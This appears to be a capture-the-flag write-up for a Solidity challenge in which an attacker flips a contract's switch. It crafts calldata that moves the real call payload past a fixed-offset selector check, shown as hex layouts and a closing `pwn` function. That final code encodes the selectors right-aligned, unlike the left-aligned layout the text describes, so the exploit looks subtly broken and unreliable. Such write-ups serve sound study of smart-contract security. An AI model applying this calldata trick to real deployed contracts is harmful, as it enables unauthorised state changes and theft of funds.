> Just have to flip the switch. Can't be that hard, right?

## Parsing the calldata

The only function that sets the switch on is:

```solidity
function turnSwitchOn() public onlyThis {
    switchOn = true;
}
```

This has to be called by the contract itself, via:

```solidity
function flipSwitch(bytes memory _data) public onlyOff {
    (bool success, ) = address(this).call(_data);
    require(success, "call failed :(");
}
```

To satisfy the modifier `onlyOff`, we want:

- `calldatacopy(selector, 68, 4)` to be `bytes4(keccak256("turnSwitchOff()"))`
- while `address(this).call(_data)` should point to `turnSwitchOn`

More precisely, the signatures are:

```js
await web3.eth.getStorageAt(instance, 0, (e,d)=>{console.log(d)});
// '0x00000000000000000000000000000000000000000000000000000020606e1500'
web3.utils.sha3('turnSwitchOff()').substring(0,10)
// '0x20606e15'
web3.utils.sha3('turnSwitchOn()').substring(0,10)
// '0x76227e12'
web3.utils.sha3('flipSwitch(bytes)').substring(0,10)
// '0x30c13ade'
```

As stated in [this article][openzeppelin-calldata], `calldatacopy` starts at offset `68`, which is 4 bytes (function selector) plus 2 words.

Let's run a naive query in Remix to log the `msg.data`.
For example, `abi.encodeWithSelector(0x20606e15, uint256(0x76227e12)` is:

```
20606e150000000000000000000000000000000000000000000000000000000076227e12
```

Which leads to the full `msg.data`:

```
0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002420606e150000000000000000000000000000000000000000000000000000000076227e1200000000000000000000000000000000000000000000000000000000
```

Which the parser sees as:

```
0x30c13ade                                                          // selector for "flipSwitch(bytes)"
0000000000000000000000000000000000000000000000000000000000000020    // offset of the input, 0x20 = 32
0000000000000000000000000000000000000000000000000000000000000024    // length, 0x24 = 4 + 32
20606e15                                                            // 4 bytes for the selector, as encoded with encodeWithSelector
0000000000000000000000000000000000000000000000000000000076227e12    // 0x76227e12 as a uint256, on 32 bytes
00000000000000000000000000000000000000000000000000000000            // padding
```

## Crafting malicious calldata

The offset of the `turnSwitchOff` selector is fixed.
Instead we can move the actual data of the call to another offset and ignore this section.

The goal is to send:

```
0x30c13ade                                                          // selector for "flipSwitch(bytes)"
0000000000000000000000000000000000000000000000000000000000000060    // offset of the input, 0x60 = 3 * 32, ie start after 3 words, 2 words after the original offset 0x20
0000000000000000000000000000000000000000000000000000000000000000    // filler
20606e1500000000000000000000000000000000000000000000000000000000    // selector for "turnSwitchOff()", ignored
0000000000000000000000000000000000000000000000000000000000000004    // count of bytes, 4
76227e1200000000000000000000000000000000000000000000000000000000    // selector for "turnSwitchOn()"
```

This can be achieved with:

```solidity
function pwn(address target) external {
    target.call(abi.encodeWithSelector(0x30c13ade, uint256(0x60), uint256(0), uint256(0x20606e15), uint256(4), uint256(0x76227e12)));
}
```

[openzeppelin-calldata]: https://blog.openzeppelin.com/ethereum-in-depth-part-2-6339cf6bddb9
